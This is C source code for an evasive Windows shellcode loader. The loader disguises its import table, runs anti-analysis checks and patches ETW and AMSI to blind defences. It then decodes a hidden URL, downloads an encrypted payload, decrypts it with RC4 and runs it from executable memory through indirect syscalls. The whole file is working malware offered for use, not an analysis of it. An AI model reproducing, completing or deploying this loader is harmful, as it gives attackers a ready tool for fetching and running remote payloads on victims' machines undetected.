// =============================================
// main.c - Shellcode Loader
// =============================================

#include "Common.h"

// Instantiate encoded data (auto-generated in Payload.h)
static unsigned char EncodedUrl[] = INIT_ENCODED_URL;
static unsigned char ProtectedKey[] = INIT_PROTECTED_KEY;

// -----------------------------------------------
// Decode XOR-encoded URL string at runtime
// -----------------------------------------------
static VOID DecodeUrl(OUT PCHAR pOut, IN PBYTE pEncoded, IN DWORD dwLen, IN BYTE bKey) {
    for (DWORD i = 0; i < dwLen; i++)
        pOut[i] = (CHAR)(pEncoded[i] ^ bKey);
}

// -----------------------------------------------
// Entry Point
// -----------------------------------------------
int Main(VOID) {

    NTAPI_FUNC  NtApis  = { 0 };
    API_HASHING WinApis = { 0 };
    NTSTATUS    STATUS  = 0x00;

    IatCamouflage();

#ifndef DEBUG
    if (!AntiAnalysis())
        return 0;
#endif

    if (!InitializeNtSyscalls(&NtApis))
        return 0;

    if (!InitializeWinApis(&WinApis))
        return 0;

    PatchEtw(&WinApis);
    PatchAmsi(&WinApis);

    // Key recovery
    PBYTE pRealKey = NULL;
    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, KEY_SIZE, &pRealKey))
        return 0;

    // Load encrypted payload
    PBYTE pPayload = NULL;
    DWORD dwPayloadSize = 0;

    // Decode URL and download
    CHAR szUrl[512] = { 0 };
    DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
    LOG("[*] Downloading payload...");
    if (!DownloadPayload(&WinApis, szUrl, &pPayload, &dwPayloadSize)) {
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    // Wipe URL from stack
    MemSet(szUrl, 0, sizeof(szUrl));
    LOG("[+] Payload loaded");

    // Decrypt
    if (!Rc4DecryptPayload(&WinApis, pPayload, dwPayloadSize, pRealKey, KEY_SIZE)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    MemSet(pRealKey, 0, KEY_SIZE);
    HeapFree(GetProcessHeap(), 0, pRealKey);

    // Allocate RW
    PVOID   pExec       = NULL;
    SIZE_T  sRegion     = (SIZE_T)dwPayloadSize;

    SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
        (ULONG_PTR)0, (ULONG_PTR)&sRegion,
        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
        0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        return 0;
    }

    // Copy + wipe heap
    MemCopy(pExec, pPayload, dwPayloadSize);
    MemSet(pPayload, 0, dwPayloadSize);
    HeapFree(GetProcessHeap(), 0, pPayload);

    // RW -> RWX
    ULONG   dwOldProt   = 0;
    SIZE_T  sProtSize   = (SIZE_T)dwPayloadSize;
    PVOID   pProtAddr   = pExec;

    SET_SYSCALL(NtApis.NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
        (ULONG_PTR)&sProtSize, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
        (ULONG_PTR)&dwOldProt,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS))
        return 0;

    // Execute via NtCreateThreadEx (indirect syscall - no kernel32 import)
    HANDLE hThread = NULL;
    SET_SYSCALL(NtApis.NtCreateThreadEx);
    STATUS = RunSyscall(
        (ULONG_PTR)&hThread,            // [out] thread handle
        (ULONG_PTR)0x1FFFFF,            // THREAD_ALL_ACCESS
        (ULONG_PTR)NULL,                // object attributes
        (ULONG_PTR)(HANDLE)-1,          // current process
        (ULONG_PTR)pExec,               // start routine
        (ULONG_PTR)NULL,                // argument
        (ULONG_PTR)0,                   // create flags
        (ULONG_PTR)0,                   // zero bits
        (ULONG_PTR)0,                   // stack size
        (ULONG_PTR)0,                   // max stack size
        (ULONG_PTR)NULL,                // attribute list
        (ULONG_PTR)0                    // padding
    );
    if (!NT_SUCCESS(STATUS))
        return 0;

    // Wait via NtWaitForSingleObject (indirect syscall)
    SET_SYSCALL(NtApis.NtWaitForSingleObject);
    RunSyscall(
        (ULONG_PTR)hThread,             // handle
        (ULONG_PTR)FALSE,               // alertable
        (ULONG_PTR)NULL,                // timeout (NULL = infinite)
        0, 0, 0, 0, 0, 0, 0, 0, 0      // padding
    );

    return 0;
}
